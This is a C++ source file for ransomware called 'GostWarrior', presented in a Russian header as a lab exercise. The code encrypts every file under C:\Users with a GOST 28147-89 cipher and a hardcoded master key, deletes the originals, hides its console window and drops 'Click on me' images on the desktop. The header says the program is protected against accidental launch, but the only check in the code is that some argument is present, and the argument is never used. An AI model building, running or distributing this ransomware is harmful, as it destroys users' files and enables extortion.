/**

	Лабораторный "вирус-шифровальщик" GostWarrior
	Атакует компьютеры с ОС Windows, начиная с Windows NT 6.x и старше.
	Ключевой особенностью является использование отечественного алгоритма симметричного блочного шифрования ГОСТ 28147-89
	и разработанной на его основе кастомной хеш-функции.
	Для шифрования каждого файла использует динамически генерируемый файловый ключ и общий главный ключ.
	При запуске шифрует доступные файлы в C:\Users и его подкаталогах.

	Алгоритм шифрования каждого файла:
	1) сгенерировать файловый ключ на основе хеш-функции от файла
	2) зашифровать содержимое исходного файла, используя файловый ключ
	3) записать зашифрованные данные в новый файл в том же расположении и с тем же именем с расширением .gw
	4) зашифровать файловый ключ главным ключом
	5) дописать зашифрованный файловый ключ и данные о размере исходного файла к зашифрованному файлу
	6) удалить исходный файл

	Код может работать в режимах шифрования и дешифрования, в зависимости от параметров компиляции.
	Данная программа была разработана исключительно в учебных целях, потому имеет защиту от непреднамеренного запуска
	и не содержит функций автоматического распространения, маскировки или вмешательства в работу средств защиты.

**/

#include <iostream>
#include <string>
#include <sstream>
#include <fstream>
#include <filesystem>
#include <windows.h>
using namespace std;
namespace fs = std::filesystem;

static const uint8_t sBox[][16] = {
	{4, 10, 9, 2, 13, 8, 0, 14, 6, 11, 1, 12, 7, 15, 5, 3},
	{14, 11, 4, 12, 6, 13, 15, 10, 2, 3, 8, 1, 0, 7, 5, 9},
	{5, 8, 1, 13, 10, 3, 4, 2, 14, 15, 12, 7, 6, 0, 9, 11},
	{7, 13, 10, 1, 0, 8, 9, 15, 14, 4, 6, 12, 11, 2, 5, 3},
	{6, 12, 7, 1, 5, 15, 13, 8, 4, 10, 9, 14, 0, 3, 11, 2},
	{4, 11, 10, 0, 7, 2, 1, 13, 3, 6, 8, 5, 9, 12, 15, 14},
	{13, 11, 4, 1, 3, 15, 5, 9, 0, 10, 14, 7, 6, 8, 2, 12},
	{1, 15, 13, 0, 5, 7, 10, 4, 9, 2, 3, 14, 6, 11, 8, 12}
};


void processRound(uint64_t* block, uint32_t roundKey, bool last=false) {
	uint32_t* A = (uint32_t*)block;
	uint32_t* B = (uint32_t*)block + 1;
	//cout << "key = " << roundKey << endl;
	roundKey += *A;
	//cout << roundKey << endl;
	for (int i = 0; i < 4; i++) {
		uint8_t item1 = *((uint8_t*)&roundKey + i) >> 4;
		//cout << "<>" << (int)item1;
		uint8_t item2 = *((uint8_t*)&roundKey + i) & 0x0F;
		//cout << " " << (int)item2;
		*((uint8_t*)&roundKey + i) = (sBox[2*i][item1] << 4) + sBox[2*i+1][item2];
	}
	//cout << endl << roundKey << endl;
	roundKey = (roundKey << 11) | (roundKey >> 32-11);
	//cout << roundKey << endl;
	if (!last) {
		uint32_t temp = *A;
		*A = *B ^ roundKey;
		*B = temp;
	}
	else *B = *B ^ roundKey;
}

void processBlock(uint64_t* block, char* key, bool enc=true) {
	//cout << "---" << endl;
	//for (int i = 0; i < 8; i++) {
	//	cout << hex << ((char*)block)[i] << " ";
	//}
	//cout << endl;
	//cout << "Block:\t" << *block << endl;
	uint32_t rk;
	for (int i = 0; i < 32; i++) {
		if ((i < 24)&&enc || (i<8)&&!enc) rk = *((uint32_t*)key + i % 8);
		else rk = *((uint32_t*)key + 7 - i % 8);
		if (i < 31) processRound(block, rk);
		else processRound(block, rk, true);
		//cout << "Round " << i << ":\t" << *block << endl;
	}
	//cout << "Out:\t" << *block << endl;
}

size_t encrypt(char* msg, int length, char* key, bool mode=true) {
	int bufsize = length % 8 == 0 ? length : length + 8 - length % 8;
	//if (!mode) bufsize = length - length % 8;
	for (int i = 0; i < bufsize / 8; i++) {
		processBlock((uint64_t*)(msg+8*i), key, mode);
	}
	return bufsize;
}

void printline(char* line, int length) {
	for (int i = 0; i < length; i++) cout << line[i];
	cout << endl;
}

void printhex32(char* msg) {
	for (int i = 0; i < 4; i++) cout << hex << *(uint64_t*)(msg + 4 * i);
	cout << endl;
}

char* gost_hash(char* msg, size_t length) {
	cout << "***\n[Generating secret]\n";
	size_t bufsize = length % 8 == 0 ? length : length + 8 - length % 8;
	char* buf = new char[bufsize]();
	for (int i = 0; i < bufsize; i++)
		if (i < length) buf[i] = msg[i];
		else buf[i] = 'a';
	char* key = new char[32];
	for (int i = 0; i < 32; i++) {
		key[i] = msg[length - 1 - i % length];
	}
	for (int i = 0; i < bufsize / 8; i++) {
		processBlock((uint64_t*)(buf+8*i), key);
		for (int j = 0; j < 4; j++) *(uint64_t*)(key + 8 * j) ^= *(uint64_t*)(buf + 8 * i);
		for (int j = 0; j < 8; j++) {
			uint32_t rk = *(uint32_t*)(key + 4 * j);
			*(uint32_t*)(key + 4 * j) = (rk << 11) | (rk >> 32 - 11);
		}
	}
	cout << "HASH:\t";
	for (int i = 0; i < 4; i++) cout << hex << *(uint64_t*)(key + 4*i);
	cout << endl;
	return key;
}

#define BUF_SIZE 4096

bool encryptFile(string filename, char* buf, char* master) {
	string filekeystring = filename + "GostWarrior simple filekey salt";
	char* filekey = gost_hash((char*)filekeystring.c_str(), filekeystring.size());
	fstream input, output;
	input.open(filename, ios::binary | ios::in);
	output.open(filename + ".gw", ios::binary | ios::out);
	if (input.is_open() && output.is_open()) {
		input.seekg(0, ios::beg);
		size_t fsize = 0;
		while (!input.eof()) {
			input.read(buf, BUF_SIZE);
			fsize += input.gcount();
			size_t newlen = encrypt(buf, input.gcount(), filekey);
			output.write(buf, newlen);
		}
		output.write((char*)&fsize, sizeof(fsize));
		cout << filename << endl;
		cout << "Size: " << fsize << endl;
		cout << "Filekey: \t";
		printhex32(filekey);
		cout << "Encrypted: \t";
		encrypt(filekey, 32, master);
		output.write(filekey, 32);
		printhex32(filekey);
		cout << "----------------------\n";
		input.close();
		output.close();
	}
	else return false;
	delete[] filekey;
	return true;
}

bool decryptFile(string filename, char* buf, char* master) {
	fstream input, output;
	char* filekey = new char[32];
	size_t fsize = 0;
	input.open(filename, ios::in | ios::binary);
	output.open(filename.substr(0, filename.size()-2), ios::out | ios::binary);
	if (input.is_open() && output.is_open()) {
		input.seekg(-36, ios::end);
		input.read((char*)&fsize, sizeof(fsize));
		input.read(filekey, 32);
		printhex32(filekey);
		encrypt(filekey, 32, master, false);
		printhex32(filekey);
		cout << "Size: " << fsize;
		input.seekg(0, ios::beg);
		bool endData = false;
		while (!input.eof()) {
			input.read(buf, BUF_SIZE);
			if (input.gcount() > fsize) endData = true;
			else fsize = fsize - input.gcount();
			encrypt(buf, (endData ? fsize : BUF_SIZE), filekey, false);
			output.write(buf, (endData ? fsize : BUF_SIZE));
			if (endData) break;
		}
		input.close();
		output.close();
	}
	else return false;
	delete[] filekey;
	return true;
}

#define _CRT_SECURE_NO_WARNINGS

int main(int argc, char** argv)
{
	if (argc < 2) {
		cout << "No parameter path!" << endl;
		return 1;
	}
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	string path = "C:\\Users";
	char* buf = new char[BUF_SIZE];
	string key = "11112222333344445555666677778888";
	char* master = (char*)key.c_str();
	for (const auto& entry : fs::recursive_directory_iterator(path, fs::directory_options::skip_permission_denied)) {
		if (entry.is_regular_file() && entry.path().extension().string() != ".gw") {
			cout << entry.path().string() << endl;
			if (encryptFile(entry.path().string(), buf, master)) {
				error_code ec;
				fs::remove(entry, ec);
			}
		}
	}
	string desktop = "C:\\Users\\Тест\\Desktop\\Click on me";
	for (int i = 0; i < 64; i++) {
		fs::copy("C:\\image.png", desktop + to_string(i) + ".png");
	}
	delete[] buf;
	return 0;
}